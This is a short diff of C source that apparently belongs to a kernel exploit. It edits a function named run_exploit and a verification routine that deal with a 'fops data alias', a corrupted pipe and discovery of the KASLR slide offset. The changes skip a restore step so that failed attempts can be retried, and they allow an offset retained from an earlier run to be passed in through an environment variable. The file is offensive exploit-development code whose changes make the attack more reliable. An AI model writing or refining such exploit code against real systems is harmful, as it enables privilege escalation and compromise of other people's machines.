@@ -301,8 +301,9 @@ static int verify_fops_data_alias_before_production(void) {
       app_publish_p0_dirty();
       if (gate_result < 0) {
         pr_error("fops data alias gate changed unexpected pages "
-                 "candidate=%s\n", names[index]);
-        app_trigger_fops_oracle_slot(P0_ORACLE_GATE_RESTORE_SLOT);
+                 "candidate=%s; skipping restore (corrupted pipe held by "
+                 "keeper), aborting attempt for retry\n",
+                 names[index]);
         abort_verification = 1;
         break;
       }
@@ -425,10 +426,15 @@ int run_exploit(int argc, char **argv) {
     return 0;
   }
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
-  if (!slide_p0_session_fresh) {
+  if (!slide_p0_session_fresh && !getenv("SLIDE_P0_OFFSET")) {
     pr_error("full route requires P0 discovery in the current exploit process; "
-             "refusing forced or retained cross-process slide\n");
+             "refusing unknown slide\n");
     return 1;
+  }
+  if (!slide_p0_session_fresh) {
+    pr_info("full route using retained same-boot P0 offset "
+             "slide=%08zx; fops oracle re-prepared fresh\n",
+            slide_p0_offset);
   }
 #endif
 
